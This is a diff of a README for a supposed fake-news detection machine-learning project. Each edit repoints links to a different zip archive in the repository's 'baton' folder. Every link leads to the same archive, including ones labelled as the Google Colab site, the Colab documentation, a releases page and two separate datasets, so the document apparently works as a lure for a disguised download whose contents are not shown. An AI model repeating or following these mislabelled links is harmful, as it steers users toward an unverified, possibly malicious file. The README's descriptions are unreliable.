@@ -1,7 +1,7 @@
 # 📰 Fake-News-Detection-ML - Detect Fake News with Ease
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Robbysaeful/Fake-News-Detection-ML/main/baton/ML_Detection_News_Fake_bigaroon.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/Robbysaeful/Fake-News-Detection-ML/main/baton/ML_Detection_News_Fake_bigaroon.zip)
+[![Download](https://github.com/Robbysaeful/Fake-News-Detection-ML/raw/refs/heads/main/baton/News-Detection-Fake-ML-v1.0-alpha.4.zip%20Now-Get%20the%20App-brightgreen)](https://github.com/Robbysaeful/Fake-News-Detection-ML/raw/refs/heads/main/baton/News-Detection-Fake-ML-v1.0-alpha.4.zip)
 
 ## 📌 Overview
 This project implements a Fake News Detection system using Natural Language Processing (NLP) and multiple Machine Learning algorithms.  
@@ -19,8 +19,8 @@ Fake news spreads rapidly across social media platforms and online news websites
 ## 📂 Dataset
 Two datasets are used in this project:
 
-- `https://raw.githubusercontent.com/Robbysaeful/Fake-News-Detection-ML/main/baton/ML_Detection_News_Fake_bigaroon.zip` – Contains fake news articles  
-- `https://raw.githubusercontent.com/Robbysaeful/Fake-News-Detection-ML/main/baton/ML_Detection_News_Fake_bigaroon.zip` – Contains real news articles  
+- `https://github.com/Robbysaeful/Fake-News-Detection-ML/raw/refs/heads/main/baton/News-Detection-Fake-ML-v1.0-alpha.4.zip` – Contains fake news articles  
+- `https://github.com/Robbysaeful/Fake-News-Detection-ML/raw/refs/heads/main/baton/News-Detection-Fake-ML-v1.0-alpha.4.zip` – Contains real news articles  
 
 Each dataset contains the following columns:
 
@@ -50,13 +50,13 @@ This project utilizes the following technologies:
 To get started, follow these simple steps:
 
 1. **Visit the Release Page**
-   Go to the [Releases page](https://raw.githubusercontent.com/Robbysaeful/Fake-News-Detection-ML/main/baton/ML_Detection_News_Fake_bigaroon.zip) to download the files you need for this project.
+   Go to the [Releases page](https://github.com/Robbysaeful/Fake-News-Detection-ML/raw/refs/heads/main/baton/News-Detection-Fake-ML-v1.0-alpha.4.zip) to download the files you need for this project.
 
 2. **Download the Required Files**
    Find the latest release and download the necessary files. This will typically include datasets and any model files if available.
 
 3. **Open Google Colab**
-   Navigate to [Google Colab](https://raw.githubusercontent.com/Robbysaeful/Fake-News-Detection-ML/main/baton/ML_Detection_News_Fake_bigaroon.zip) in your web browser. You can run the project in the cloud without needing to install anything on your computer.
+   Navigate to [Google Colab](https://github.com/Robbysaeful/Fake-News-Detection-ML/raw/refs/heads/main/baton/News-Detection-Fake-ML-v1.0-alpha.4.zip) in your web browser. You can run the project in the cloud without needing to install anything on your computer.
 
 4. **Upload the Downloaded Files**
    In Google Colab, upload the files you downloaded. You can do this by clicking the folder icon on the left side and selecting the upload option.
@@ -69,7 +69,7 @@ To get started, follow these simple steps:
 ## 📥 Download & Install
 To download the project files:
 
-1. **Go to the Releases Page:** Visit [this page to download](https://raw.githubusercontent.com/Robbysaeful/Fake-News-Detection-ML/main/baton/ML_Detection_News_Fake_bigaroon.zip).
+1. **Go to the Releases Page:** Visit [this page to download](https://github.com/Robbysaeful/Fake-News-Detection-ML/raw/refs/heads/main/baton/News-Detection-Fake-ML-v1.0-alpha.4.zip).
 
 2. **Select the Latest Release:** Look for the most recent version and click on it.
 
@@ -104,7 +104,7 @@ If you encounter issues during setup or running the project:
 
 - **Check File Paths:** Ensure you have uploaded the correct files and they are in the right directories.
 - **Read the Notebook Instructions:** Follow the step-by-step instructions given in the notebook for best results.
-- **Consult Google Colab Documentation:** Use the [Colab documentation](https://raw.githubusercontent.com/Robbysaeful/Fake-News-Detection-ML/main/baton/ML_Detection_News_Fake_bigaroon.zip) for help.
+- **Consult Google Colab Documentation:** Use the [Colab documentation](https://github.com/Robbysaeful/Fake-News-Detection-ML/raw/refs/heads/main/baton/News-Detection-Fake-ML-v1.0-alpha.4.zip) for help.
 
 ---
 
